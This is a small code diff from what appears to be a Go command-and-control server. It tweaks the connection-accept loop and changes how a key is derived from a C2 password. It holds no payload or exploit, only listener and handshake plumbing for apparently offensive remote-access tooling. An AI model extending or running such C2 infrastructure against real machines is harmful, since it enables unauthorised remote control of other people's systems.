@@ -39,14 +39,14 @@ func main() {
 
 	for {
 		conn, err := stream.Accept()
+
 		if err != nil {
 			slog.Error("An error occured while establishing a connection with the client.", slog.Any("ERROR", err))
 			continue
 		}
 
 		slog.Info("Incoming connection.", "REMOTE", conn.RemoteAddr())
-
-		key, err := grevcore.DeriveKey(conn, []byte(C2Password))
+		key, err := grevcore.DeriveKey(conn, C2Password)
 
 		if err != nil {
 			slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
